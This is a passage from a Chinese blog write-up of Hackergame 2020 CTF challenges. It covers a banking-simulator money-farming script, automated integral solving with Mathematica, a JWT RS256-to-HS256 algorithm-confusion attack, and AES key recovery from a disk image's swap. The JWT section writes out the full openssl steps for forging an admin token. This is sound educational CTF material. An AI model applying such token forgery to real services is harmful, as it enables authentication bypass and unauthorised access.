class="token punctuation">)</span>    <span class="token keyword">return</span> r<span class="token punctuation">.</span>text</code></pre><p>办卡、转账。</p><pre class=" language-python"><code class="language-python">    <span class="token comment" spellcheck="true"># 先办卡 1储蓄卡 2-7信用卡 8-79储蓄卡</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        create_card<span class="token punctuation">(</span><span class="token string">'credit'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span> <span class="token operator">*</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        create_card<span class="token punctuation">(</span><span class="token string">'debit'</span><span class="token punctuation">)</span>    info <span class="token operator">=</span> get_info<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 转账，每张卡转167</span>    <span class="token keyword">for</span> credit_id <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>credit_id<span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            dst <span class="token operator">=</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> <span class="token punctuation">(</span>credit_id<span class="token number">-2</span><span class="token punctuation">)</span> <span class="token operator">+</span> i            amount <span class="token operator">=</span> <span class="token number">167</span>            transfer<span class="token punctuation">(</span>src<span class="token operator">=</span>credit_id<span class="token punctuation">,</span> dst<span class="token operator">=</span>dst<span class="token punctuation">,</span> amount<span class="token operator">=</span>amount<span class="token punctuation">)</span></code></pre><p>最后是每天稳定赚2狗币，写个循环。</p><p>当欠款到了2104时依次用储蓄卡还款，一直还到2004，否则就每天恰饭顺便薅羊毛。</p><pre class=" language-python"><code class="language-python">debit_card_id <span class="token operator">=</span> <span class="token number">8</span>   <span class="token comment" spellcheck="true"># 储蓄卡</span>credit_card_id <span class="token operator">=</span> <span class="token number">2</span>  <span class="token comment" spellcheck="true"># 信用卡</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    debt <span class="token operator">=</span> get_debt<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> get_debt<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2104</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span> <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 依次用后面的储蓄卡给信用卡还款</span>            transfer<span class="token punctuation">(</span>debit_card_id<span class="token punctuation">,</span> credit_card_id<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>            debit_card_id <span class="token operator">+=</span> <span class="token number">1</span>            credit_card_id <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">if</span> credit_card_id <span class="token operator">></span> <span class="token number">7</span><span class="token punctuation">:</span>                credit_card_id <span class="token operator">=</span> <span class="token number">2</span>            <span class="token keyword">if</span> debit_card_id <span class="token operator">></span> <span class="token number">79</span><span class="token punctuation">:</span>                debit_card_id <span class="token operator">=</span> <span class="token number">8</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=============================="</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>get_balance<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    eat<span class="token punctuation">(</span>debit_card_id<span class="token punctuation">)</span>    debit_card_id <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">if</span> debit_card_id <span class="token operator">></span> <span class="token number">79</span><span class="token punctuation">:</span>        debit_card_id <span class="token operator">=</span> <span class="token number">8</span>    <span class="token keyword">if</span> get_balance<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">2000</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>get_info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">break</span></code></pre><p>跑了贼久，终于得到 flag 了。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201102172850413.png" alt="flag"></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201102172637058.png" alt="flag"></p><hr><h2 id="超基础的数理模拟器"><a href="#超基础的数理模拟器" class="headerlink" title="超基础的数理模拟器"></a>超基础的数理模拟器</h2><p><em>（复现）</em></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201108021733621.png" alt="题目"></p><p>这题需要有很扎实的数理基础才行……（废话</p><p>第一种解法是手算或者直接按计算器，但我按了几题放弃了。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201108024803778.png" alt="正确的提示"></p><p>另外一种是借助网络上公开的计算器，准备爬个接口或者自己构造一个接口来用，搜遍了发现有几个<strong>可能可以用的</strong>：</p><ul><li><a href="https://zs.symbolab.com/solver/step-by-step/" target="_blank" rel="noopener">一步步解的计算器 symbolab</a></li><li><a href="https://zh.numberempire.com/definiteintegralcalculator.php" target="_blank" rel="noopener">定积分计算器</a></li><li><a href="https://www.wolframalpha.com" target="_blank" rel="noopener">WolframAlpha</a></li><li>etc.</li></ul><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201108022303182.png" alt="题目源代码"></p><p>然而发现都<strong>不能直接解析</strong>题目所给的 LaTeX，或者<strong>解不出来</strong>，再或者解出来的话<strong>精度也不够</strong>……</p><p>还有一种方案，是调用本地的服务解析 LaTeX，再进行积分运算。</p><p>于是想到了某红色软件，Mathematica，又称 MMA。</p><p>早就听说这玩意符号计算贼厉害了，虽然之前也没用过，还是比赛现装现学的，但用了就发现真的强，太香了，<del>早知道用来解高数里的微积分题多好</del>。</p><p>搜了搜发现 MMA 支持解析 LaTeX 表达式，太好了！</p><p>原理就是用 Python 的 requests 库把题目网页爬下来，用 Beautifulsoup 解析得到 LaTeX 公式，调用 MMA 解析表达式并进行积分运算，最后用 requests 提交答案，做一个循环解个400题就完事了。</p><p>参考 <a href="https://reference.wolfram.com/language/tutorial/ImportingAndExporting.html#32618" target="_blank" rel="noopener">Wolfram 官方文档 生成和导入 TeX</a>，可以用下面的语句将 LaTeX 转换为 MMA 的表达式。</p><pre class=" language-mathematica"><code class="language-mathematica">ToExpression["input",TeXForm]</code></pre><p>但由于 MMA 不支持这个题目给的这个 LaTeX 格式，需要把积分上下限提取出来，最后的 <code>{d x}</code> 也要替换为 <code>dx</code>，所有的单斜杠 <code>\</code> 要替换为双斜杠 <code>\\</code>，积分表达式也要用 <code>\\left(</code> <code>\\right)</code> 包含起来。</p><p>好了，现在在 MMA 里调好能解析 LaTeX 并积分了，下面来整和 Python 的接口。</p><p>参考 <a href="https://reference.wolfram.com/language/WolframClientForPython/index.html" target="_blank" rel="noopener">wolfram 官方文档 Wolfram Client Library for Python</a>，官方提供了一个客户端进行交互，也可以在 MMA 里调用 Python 执行。</p><p>然而！其他都能用，一把上述调好的解析 LaTeX 的代码用这个 client 执行，终端就卡死了，啥反应没有，人傻了。试了好久不知道是我写的问题还是他本身的问题了。。</p><p>最后实在不行，改用命令行执行，可以调用安装目录下的 <code>wolframscript -code &lt;CodeHere&gt;</code> 来执行代码。就类似于 Python 的 <code>python3 -c &lt;CodeHere&gt;</code> 用法。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201108023824075.png" alt="directory"></p><p>然而发现也不行，可能由于引号和<code>[ ]</code>的问题语法不对执行失败了。</p><p>最后没办法了，干脆直接跑个终端吧。</p><p>参考 <a href="https://blog.csdn.net/Hongkun_419/article/details/103767479" target="_blank" rel="noopener">windows下python3如何调用mathematica进行高级计算</a> 这一篇，用 winpexpect 来进行交互式操作。</p><p>（发现有大师傅直接用 pwntools 进行交互，其实也行 2333.</p><p>具体现在一会儿还说不清楚，后面专门写一篇讲这个交互的吧，<del>代码还没优化好，终端超时还没处理好以至于会开一堆终端……</del></p><p>反正就调用 MMA 去计算，然后输出结果读进来，调用 <code>/submit</code> 接口提交答案。</p><p>好不容易到这一步都差不多了，心态已经炸的不行了（已经调了一下午了）。结果发现怎么一直卡在 399 题下不去？？？</p><p>开始怀疑我 POST 请求参数是不是不对，题目需要的是 <code>x-www-form-urlencoded</code>，难不成整了 <code>form-data</code> 或者其他的？</p><p>用 <a href="http://httpbin.org" target="_blank" rel="noopener">httpbin</a> 试了试，又在 VPS 上搭了个接口接收试了试，没毛病啊……</p><p>再看代码，难不成 cookie 炸了。写了挺多爬虫了，一般都用 <code>requests.Session()</code> 维持 Cookie 状态，之前也没碰到炸的，不会这里坏掉吧。</p><p>再去研究了亿次提交过程，发现 POST 会带上此时的 Cookie，返回一个302跳转，同时 Set-Cookie，跳转之后 GET 方法带上新的 Cookie 去访问根目录，得到返回的同时又设置了新的 Cookie。</p><p>手动用 Postman 模拟了一下，如果（跟随 302 跳转）不及时更新 Cookie 的话，确实会一直卡在之前的状态，甚至连 <code>答案正确</code>、<code>答案错误</code>之类的话都一模一样，还需解答的题目数量也不变，太草了！</p><p><strong>于是比赛的时候就卡这里了。又调了一晚上心态彻底炸了。。</strong>  <em><del>（后来就没打了</del></em></p><p><del>现在想想应该是我把初始的 <code>Cookie</code> 写到了 <code>Headers</code> 里的原因吧，后面单独设置 cookie，慢慢优化代码再试试。</del></p><blockquote><p><strong>20201109 Update:</strong></p><p>优化了亿下，现在差不多了，能流畅求解了，后面专门写一篇讲讲 Python 和 MMA 交互的。 <em>（留坑）</em></p><p>先简单说一说吧。</p><p><strong>参考 Mathematica 计算式：</strong></p><pre class=" language-mathematica"><code class="language-mathematica">NIntegrate[ToExpression["\\sqrt{x} + \\frac{5}{x} + \\ln\\left(x\\right) + \\sin\\left(\\ln\\left(x\\right)\\right)",TeXForm],{x,ToExpression["\\frac{2}{3}",TeXForm],ToExpression["\\frac{4}{3}",TeXForm]},WorkingPrecision->12]</code></pre><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201109012506678.png" alt="MMA示例"></p><p>之前试了直接用 <code>ToExpression</code> 把包含 <code>\\int_{}^{}</code> 的积分表达式全部写进去，但发现计算速度特别慢，甚至会卡死，而且结果也不对。</p><p>还是单独把被积表达式、上下限提取出来，用自带的 <code>NIntegrate</code> 积分求解，顺便指定精度来的实在。</p><p>另外，这个题目卡在 399 题下不去的原因应该是初始时候的 Cookie 设置不对，在302跳转的设置上，经测试，<code>allow_redirects</code> 无论是 True 或者 False，Cookie 都能正确更新，也就是说用 <code>requests.Session()</code> 来维持 Cookie 状态是没问题的。</p><p>在<strong>最开始的时候加上一个登录，把自己的 token 带上</strong>就能解决问题了，与<code>allow_redirects</code> 设置无关。这题甚至连 headers 都不需要设置。</p><p>参考代码如下。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote_plus<span class="token keyword">import</span> requestssession <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>token <span class="token operator">=</span> <span class="token string">'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'</span>resp <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span> f<span class="token string">"http://202.38.93.111:10190/login?token={quote_plus(token)}"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># ...</span></code></pre></blockquote><blockquote><p>看了官方 WP 发现 Python 里的 sympy 库居然自带有解析 LaTeX 的，害，还是太菜了。</p></blockquote><hr><h2 id="普通的身份认证器"><a href="#普通的身份认证器" class="headerlink" title="普通的身份认证器"></a>普通的身份认证器</h2><blockquote><p>近日，小 T 接手了某个老旧 Python 网站的重构工作。接手之后，他把原先的 requirements.txt  复制到了新项目下，更换了后端框架，照着框架文档魔改了身份认证部分的内容，写出了一个测试用的原型。看起来一切都很正常，只是他似乎没有仔细检查每一项依赖的版本。</p><p>「懒得管了，又不是不能用！」但果真如此吗？</p></blockquote><p>登录后会返回一个 <code>access_token</code>，base64 解码一下很明显是 JWT。当然 JavaScript 代码里逻辑也很明显了。</p><pre><code>{"typ":"JWT","alg":"RS256"}.{"sub":"guest","exp":1604399671}.........</code></pre><blockquote><p>一个 JWT 实际上就是一个字符串，它由三部分组成：<strong>头部 Header、载荷 Payload 与签名 Signature</strong>。将这三段信息文本用.链接一起就构成了 JWT 字符串。</p><p>参考官网 <a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a></p><p>以及 阮一峰的 <a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html" target="_blank" rel="noopener">JSON Web Token 入门教程</a></p></blockquote><p>再点击 <code>获取用户信息</code> 时把这个 jwt 放到 请求头的 <code>Authorization</code> 参数里，同时也带上 <code>Hg-Token</code> 即你自己 hackergame 的 token。</p><p>根据题目提示，身份认证的版本上有漏洞，查了一下。</p><p>参考 <a href="https://www.nccgroup.com/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/" target="_blank" rel="noopener">JWT Attack Walk-Through</a> 一文。</p><blockquote><p>There’s a well-known defect [1] with older versions of certain libraries where you can trick a JSON Web Token (JWT) consumer that expects tokens signed using <em>asymmetric</em> cryptography into accepting a <em>symmetrically</em> signed token. This article assumes you’re comfortable with JWTs and the theory of this attack, but the nub of it is that by <strong>switching the token algorithm from ‘RS’ to ‘HS’, a vulnerable endpoint will use its public  key to verify the token in a symmetric way</strong> (and being public, that key isn’t much of a secret).</p></blockquote><p>简单的说就是把 RS -&gt; HS，而后后端就用公钥去验证 token。</p><p>另外根据 HTML 里的提示，系统用了 FastAPI, Axios and Vue.js。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103182611421.png" alt="html"></p><p>其中 <a href="https://fastapi.tiangolo.com/zh/#api" target="_blank" rel="noopener">FastAPI 自身带有 API 文档</a>。</p><p>在这题中就是 <a href="http://202.38.93.111:10092/docs" target="_blank" rel="noopener">http://202.38.93.111:10092/docs</a> 以及 <a href="http://202.38.93.111:10092/redoc" target="_blank" rel="noopener">http://202.38.93.111:10092/redoc</a></p><p>发现有一个 <code>POST /debug</code> 的接口，请求一下试试。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103184932948.png" alt="debug API"></p><p>正好合适，这应该就是我们需要的公钥了。</p><pre><code>-----BEGIN RSA PUBLIC KEY-----MIICCgKCAgEAn/KiHQ+/zwE7kY/Xf89PY6SowSb7CUk2b+lSVqC9u+R4BaE/5tNFeNlneGNny6fQhCRA+Pdw1UJSnNpG26z/uOK8+H7fMb2Da5t/94wavw410sCKVbvfft8gKquUaeq//tp20BETeS5MWIXp5EXCE+lEdAHgmWWoMVMIOXwaKTMnCVGJ2SRr+xH9147FZqOa/17PYIIHuUDlfeGi+Iu7T6a+QZ0tvmHL6j9Onk/EEONuUDfElonYM688jhuAM/FSLfMzdyk23mJk3CKPah48nzVmb1YRyfBWiVFGYQqMCBnWgoGOanpd46Fp1ff1zBn4sZTfPSOus/+00D5Lxh6bsbRa6A1vAApfmTcu026lIb7gbG7DU1/seDId9s1qA5BJpzWFKO4ztkPGvPTUok8hQBMDaSH1JOoFQgfJIfC7w2CQe+KbodQL3akKQDCZhcoA4tf5VC6ODJpFxCn6blML5cD6veOBPJiIk8DBRgmt2AHzOUju+5nsQcplOVxW5TFYxLqeJ8FPWqQcVekZ749FjchtAwPlUsoWIH0PTSun38ua8usrwTXbpBlf4r0wz22FPqaecvp7z6Rj/xfDauDGDSU4hmn/TY9Fr+OmFJPW/9k2RAv7KEFvFCLP/3U3r0FMwSe/FPHmt5fjAtsGlZLj+bZsgwFllYeD90VQU8Ds+KkCAwEAAQ==-----END RSA PUBLIC KEY-----</code></pre><p>把公钥保存带 <code>key.pem</code> 文件中。</p><p>这里要注意一下，<strong>换行用的是 <code>\n</code></strong>，即十六进制的 <code>0A</code>，而不是 <code>\r\n</code> (<code>0D0A</code>)。且<strong>最末尾有 <code>\n</code></strong>。</p><p>转十六进制。</p><pre class=" language-bash"><code class="language-bash">$ <span class="token function">cat</span> key.pem <span class="token operator">|</span> xxd -p <span class="token operator">|</span> <span class="token function">tr</span> -d <span class="token string">"\\n"</span>2d2d2d2d2d424547494e20525341205055424c4943204b45592d2d2d2d2d0a4d49494343674b43416745416e2f4b6948512b2f7a7745376b592f58663839505936536f7753623743556b32622b6c5356714339752b52344261452f35744e460a654e6c6e65474e6e79366651684352412b50647731554a536e4e704732367a2f754f4b382b4837664d6232446135742f39347761767734313073434b566276660a667438674b7175556165712f2f747032304245546553354d5749587035455843452b6c45644148676d57576f4d564d494f5877614b544d6e4356474a325352720a2b784839313437465a714f612f313750594949487555446c666547692b4975375436612b515a3074766d484c366a394f6e6b2f45454f4e75554466456c6f6e590a4d3638386a6875414d2f46534c664d7a64796b32336d4a6b33434b50616834386e7a566d6231595279664257695646475951714d43426e57676f474f616e70640a34364670316666317a426e34735a546650534f75732f2b303044354c786836627362526136413176414170666d5463753032366c496237676247374455312f730a65444964397331714135424a707a57464b4f347a746b5047765054556f6b386851424d44615348314a4f6f465167664a4966433777324351652b4b626f64514c0a33616b4b5144435a68636f41347466355643364f444a704678436e36626c4d4c3563443676654f42504a69496b38444252676d743241487a4f556a752b356e730a5163706c4f56785735544659784c71654a3846505771516356656b5a373439466a6368744177506c55736f57494830505453756e3338756138757372775458620a70426c66347230777a32324650716165637670377a36526a2f7866446175444744535534686d6e2f54593946722b4f6d464a50572f396b32524176374b4546760a46434c502f3355337230464d7753652f4650486d7435666a417473476c5a4c6a2b625a736777466c6c59654439305651553844732b4b6b434177454141513d3d0a2d2d2d2d2d454e4420525341205055424c4943204b45592d2d2d2d2d0a</code></pre><p>Payload 里</p><p>加密算法由 <code>RS256</code> 降级为 <code>HS256</code>，再根据题目要求，需要把 <code>guest</code> 改成 <code>admin</code>.</p><pre><code>{"typ":"JWT","alg":"HS256"}.{"sub":"admin","exp":1604399671}</code></pre><p>base64 编码一下，且去掉结尾的 <code>=</code>，注意不要丢掉中间的 <code>.</code>。</p><pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTYwNDM5OTY3MX0</code></pre><p>下面开始算加密所用的<strong>签名（Signature）</strong>。</p><p>把上面得到的证书加载进来，用他来加密。</p><pre class=" language-bash"><code class="language-bash">$ <span class="token keyword">echo</span> -n <span class="token string">"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTYwNDM5OTY3MX0"</span> <span class="token operator">|</span> openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20525341205055424c4943204b45592d2d2d2d2d0a4d49494343674b43416745416e2f4b6948512b2f7a7745376b592f58663839505936536f7753623743556b32622b6c5356714339752b52344261452f35744e460a654e6c6e65474e6e79366651684352412b50647731554a536e4e704732367a2f754f4b382b4837664d6232446135742f39347761767734313073434b566276660a667438674b7175556165712f2f747032304245546553354d5749587035455843452b6c45644148676d57576f4d564d494f5877614b544d6e4356474a325352720a2b784839313437465a714f612f313750594949487555446c666547692b4975375436612b515a3074766d484c366a394f6e6b2f45454f4e75554466456c6f6e590a4d3638386a6875414d2f46534c664d7a64796b32336d4a6b33434b50616834386e7a566d6231595279664257695646475951714d43426e57676f474f616e70640a34364670316666317a426e34735a546650534f75732f2b303044354c786836627362526136413176414170666d5463753032366c496237676247374455312f730a65444964397331714135424a707a57464b4f347a746b5047765054556f6b386851424d44615348314a4f6f465167664a4966433777324351652b4b626f64514c0a33616b4b5144435a68636f41347466355643364f444a704678436e36626c4d4c3563443676654f42504a69496b38444252676d743241487a4f556a752b356e730a5163706c4f56785735544659784c71654a3846505771516356656b5a373439466a6368744177506c55736f57494830505453756e3338756138757372775458620a70426c66347230777a32324650716165637670377a36526a2f7866446175444744535534686d6e2f54593946722b4f6d464a50572f396b32524176374b4546760a46434c502f3355337230464d7753652f4650486d7435666a417473476c5a4c6a2b625a736777466c6c59654439305651553844732b4b6b434177454141513d3d0a2d2d2d2d2d454e4420525341205055424c4943204b45592d2d2d2d2d0a<span class="token punctuation">(</span>stdin<span class="token punctuation">)</span><span class="token operator">=</span> 6b218e036017e7e9d3679add51314fe3fca177b2bdc0316b5944ac6aa965addc</code></pre><p>最后一行即得到的 HMAC signature 结果，再将这个 ASCII hex signature 转换为 JWT format。</p><blockquote><p><code>=</code>被省略、<code>+</code>替换成<code>-</code>，<code>/</code>替换成<code>_</code> 。（Base64URL 算法）</p></blockquote><p>Python 的一行代码实现。</p><pre class=" language-bash"><code class="language-bash">$ python -c <span class="token string">"exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('6b218e036017e7e9d3679add51314fe3fca177b2bdc0316b5944ac6aa965addc')).replace('=','')\")"</span>ayGOA2AX5-nTZ5rdUTFP4_yhd7K9wDFrWUSsaqllrdw</code></pre><p>最后拼接得到 JWT。</p><pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTYwNDM5OTY3MX0.ayGOA2AX5-nTZ5rdUTFP4_yhd7K9wDFrWUSsaqllrdw</code></pre><p>把这个放到 Authorization 里。别忘了 Hg-Token。</p><p>最后得到 flag。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103181836118.png" alt="flag"></p><p><code>flag{just_A_simple_Json_Web_T0ken_exp1oit_xxxxx}</code></p><hr><h2 id="室友的加密硬盘"><a href="#室友的加密硬盘" class="headerlink" title="室友的加密硬盘"></a>室友的加密硬盘</h2><p><em>（复现）</em></p><blockquote><p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p></blockquote><p>解压出来一个 img 文件，首先拿 WinHex 看一下。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107184631641.png" alt="winhex"></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107184704003.png" alt="分区1"></p><p>分区1里有个 keyfile，内容为</p><pre><code>I'm not that stupid to put plaintext key in /boot!</code></pre><p>啊这。</p><p>分区2不知道是啥。</p><p>分区3应该就是需要破解的加密部分了。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107184928622.png" alt="分区3"></p><p>分区4感觉像是根目录，不全。</p><p>然后在 Linux 里扔给 fdisk 看一下。</p><pre class=" language-bash"><code class="language-bash">$ <span class="token function">fdisk</span> roommates_disk_part.img Welcome to <span class="token function">fdisk</span> <span class="token punctuation">(</span>util-linux 2.31.1<span class="token punctuation">)</span>.Changes will remain <span class="token keyword">in</span> memory only, <span class="token keyword">until</span> you decide to <span class="token function">write</span> them.Be careful before using the <span class="token function">write</span> command.Command <span class="token punctuation">(</span>m <span class="token keyword">for</span> help<span class="token punctuation">)</span>: pDisk roommates_disk_part.img: 2 GiB, 2147483648 bytes, 4194304 sectorsUnits: sectors of 1 * 512 <span class="token operator">=</span> 512 bytesSector size <span class="token punctuation">(</span>logical/physical<span class="token punctuation">)</span>: 512 bytes / 512 bytesI/O size <span class="token punctuation">(</span>minimum/optimal<span class="token punctuation">)</span>: 512 bytes / 512 bytesDisklabel type: dosDisk identifier: 0xa4ee910bDevice                   Boot   Start      End  Sectors  Size Id Typeroommates_disk_part.img1 *       2048   391167   389120  190M 83 Linuxroommates_disk_part.img2       393214 16775167 16381954  7.8G  5 Extendedroommates_disk_part.img5       393216  1890303  1497088  731M 82 Linux swap / Solarisroommates_disk_part.img6      1892352  3891199  1998848  976M 83 Linuxroommates_disk_part.img7      3893248 16775167 12881920  6.1G 83 Linux</code></pre><p>可以看到有 swap 交换分区，以及不全的 Linux 分区？而且直接挂载也挂不上。</p><p>搜了一下 <strong>LUKS 加密</strong>相关的文章，找到了国外师傅的 WriteUp，参考：</p><p><a href="https://teamrocketist.github.io/2019/03/05/Forensics-BsidesSF-2019-goodluks2/" target="_blank" rel="noopener">[Forensics] BsidesSF 2019 - goodluks2</a></p><p><a href="https://teamrocketist.github.io/2019/03/05/Forensics-BsidesSF-2019-goodluks3/" target="_blank" rel="noopener">[Forensics] BsidesSF 2019 - goodluks3</a></p><p>首先用 <strong>aeskeyfind</strong> 这个工具找一找 swap 分区里有没有残留的 AES Key。发现果然有，但是一堆。。</p><p>（本来应该先把这几个分区用 <code>dd</code> 之类工具分割一下的，但我懒了嘤嘤嘤</p><pre class=" language-bash"><code class="language-bash">$ aeskeyfind roommates_disk_part.img e195501f5bf8fffe5f4c66c43249a5747875c98f9cb598c70f52a0d05f0601bcd913145b01b203ca068e48d2f40b048639d8c6f4cfe93b22c3795945ca9d9e2a000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f457895c6ffa897807497bc31320cf9bff6707e176be26a1058fa49a12ccd2762b895ea5154cea307a3f3891fd43f19c0d54ba38b8dd28519841fa818f24eaefb082c4400a34b81dbc80de81874cf03ff16d97eb9380c515d3ec48e8433d7dc64ef3b6d7b80e9ff8b13c8b801984d2c9cf6c0ca8dd342da98112f0c70f34fd5c84cdc0c14cb55bb435e75438b7d73f445ed5e90c9514b2d4264c753492bf847e89f3330a42a7f6446260df6e2f31d311e2fcfa3d6e1f4736e835b78e63c97ccc3eab90394d3e9892c87a4b2f32144c71a2b1d2e0cdefce683125d695d6ed81d6c37d7deb43c0223b8656dd6a862562a1a8360926278dc65f445eda2146844589f000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f6bc77bd328b378315a193c7dfa0d14c2f023f5565564de40a6ba66d29aedfd3d31c69dff83847a6c3c3c091e4ff6113ca5799e1b63656f0bd51bd6490c20769ce4d58f63d629f38803da3c712c5a0cc2be774b9d925d136024a181315d91ac99136ce9ce0d3f130ebe629570a08bc2ea883e451533875140027d1b3fdb5d009131c69dff83847a6c3c3c091e4ff6113ca5799e1b63656f0bd51bd6490c20769cfa01a98089a38f606c148694e7a3509aaccfc165068ed67f5715384b93e56aa6e4581675c3f947f7b537a3dd6098e4a5898b0a18c2b3b0f675c61de4106fc6a14c82f3493f9a3381f51c394ab8532bd037db64b793057aade3d6bf67cbebf933fa01a98089a38f606c148694e7a3509aaccfc165068ed67f5715384b93e56aa6e4581675c3f947f7b537a3dd6098e4a5898b0a18c2b3b0f675c61de4106fc6a1Keyfind progress: 100%</code></pre><p>或者用 <a href="https://sourceforge.net/projects/findaes/" target="_blank" rel="noopener">findaes 这个工具</a>。</p><pre class=" language-bash"><code class="language-bash">$ ./findaes roommates_disk_part.imgSearching roommates_disk_part.imgFound AES-256 key schedule at offset 0xc3ffde4:e1 95 50 1f 5b f8 ff fe 5f 4c 66 c4 32 49 a5 74 78 75 c9 8f 9c b5 98 c7 0f 52 a0 d0 5f 06 01 <span class="token function">bc</span>Found AES-256 key schedule at offset 0xc6529d8:d9 13 14 5b 01 b2 03 ca 06 8e 48 d2 f4 0b 04 86 39 d8 c6 f4 cf e9 3b 22 c3 79 59 45 ca 9d 9e 2aFound AES-256 key schedule at offset 0xc652b08:00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f 10 11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1fFound AES-256 key schedule at offset 0xc652bfc:45 78 95 c6 ff a8 97 80 74 97 <span class="token function">bc</span> 31 32 0c f9 bf f6 70 7e 17 6b e2 6a 10 58 fa 49 a1 2c <span class="token function">cd</span> 27 62Found AES-256 key schedule at offset 0xc73bde4:b8 95 ea 51 54 ce a3 07 a3 f3 89 1f d4 3f 19 c0 d5 4b a3 8b 8d d2 85 19 84 1f a8 18 f2 4e ae fbFound AES-256 key schedule at offset 0xc7aade4:08 2c 44 00 a3 4b 81 db c8 0d e8 18 74 cf 03 ff 16 d9 7e b9 38 0c 51 5d 3e c4 8e 84 33 d7 <span class="token function">dc</span> 64Found AES-256 key schedule at offset 0xcbffde4:ef 3b 6d 7b 80 e9 ff 8b 13 c8 b8 01 98 4d 2c 9c f6 c0 ca 8d d3 42 da 98 11 2f 0c 70 f3 4f d5 c8Found AES-256 key schedule at offset 0xfd13de4:4c <span class="token function">dc</span> 0c 14 cb 55 bb 43 5e 75 43 8b 7d 73 f4 45 ed 5e 90 c9 51 4b 2d 42 64 c7 53 49 2b f8 47 e8Found AES-256 key schedule at offset 0x101efde4:9f 33 30 a4 2a 7f 64 46 26 0d f6 e2 f3 1d 31 1e 2f cf a3 d6 e1 f4 73 6e 83 5b 78 e6 3c 97 cc c3Found AES-256 key schedule at offset 0x110d5de4:ea b9 03 94 d3 e9 89 2c 87 a4 b2 f3 21 44 c7 1a 2b 1d 2e 0c de fc e6 83 12 5d 69 5d 6e d8 1d 6cFound AES-256 key schedule at offset 0x1337c9d8:37 d7 de b4 3c 02 23 b8 65 6d d6 a8 62 56 2a 1a 83 60 92 62 78 <span class="token function">dc</span> 65 f4 45 ed a2 14 68 44 58 9fFound AES-256 key schedule at offset 